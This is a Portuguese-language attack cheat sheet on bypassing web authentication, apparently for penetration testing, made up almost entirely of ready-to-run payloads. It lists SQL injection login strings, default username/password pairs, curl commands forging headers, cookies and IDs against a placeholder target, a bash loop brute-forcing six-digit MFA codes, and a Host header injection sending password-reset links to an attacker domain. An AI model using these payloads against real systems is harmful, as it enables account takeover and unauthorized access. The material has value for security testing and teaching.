# Bypass de Autenticação

## SQL Injection em Login

```sql
-- Payload clássico no campo usuário
' OR '1'='1'--
admin'--
admin' #
' OR 1=1--
" OR "1"="1

-- Exemplo na query original:
-- SELECT * FROM users WHERE user='[INPUT]' AND pass='[INPUT]'
-- Injetando: admin'--
-- Resultado: SELECT * FROM users WHERE user='admin'--' AND pass='...'
-- O -- comenta o resto, ignorando a verificação de senha
```

### Variações
```sql
' OR 'x'='x
' OR 1=1#
') OR ('1'='1
') OR 1=1--
1' OR '1'='1
```

## Credenciais Padrão

```
admin:admin
admin:password
admin:123456
admin:admin123
root:root
root:toor
administrator:administrator
admin:(vazio)
test:test
```

## Bypass por Manipulação de Parâmetros

```bash
# Forçar acesso via role manipulation
curl "http://alvo.com/admin" -H "X-Forwarded-For: 127.0.0.1"
curl "http://alvo.com/admin" -H "X-Original-URL: /public"

# IDOR — trocar ID de outro usuário
curl "http://alvo.com/perfil?id=1"  # id do admin
curl "http://alvo.com/perfil?id=2"  # seu próprio id
```

## Bypass por Cookie

```bash
# Manipular cookie de role/admin
# Cookie original: role=user
# Tentar:         role=admin, role=1, role=superuser

curl "http://alvo.com/admin" --cookie "role=admin; session=abc123"
curl "http://alvo.com/admin" --cookie "isAdmin=true; session=abc123"
curl "http://alvo.com/admin" --cookie "user_type=admin; session=abc123"
```

## Bypass de MFA

```bash
# Reutilização de código
# Fixação de código (usar código anterior)
# Race condition (usar código ao mesmo tempo em duas requests)
# Brute force do código de 6 dígitos: 000000-999999

for i in $(seq -w 0 999999); do
  code=$(printf "%06d" $i)
  resp=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://alvo.com/verify" --data "code=$code&token=abc")
  [ "$resp" = "302" ] && echo "Código: $code" && break
done
```

## Bypass de Reset de Senha

```
1. Token previsível (timestamp, user_id, MD5 simples)
2. Token reutilizável (não expira após uso)
3. Resposta com token no corpo JSON
4. Host header injection → reset para domínio do atacante
```

```bash
# Host header injection para interceptar reset de senha
curl "http://alvo.com/reset-password" \
  --data "email=admin@alvo.com" \
  -H "Host: atacante.com"
```

## Com vlad.py

```bash
python vlad.py web --alvo "http://alvo.com/login" --tipo auth
```
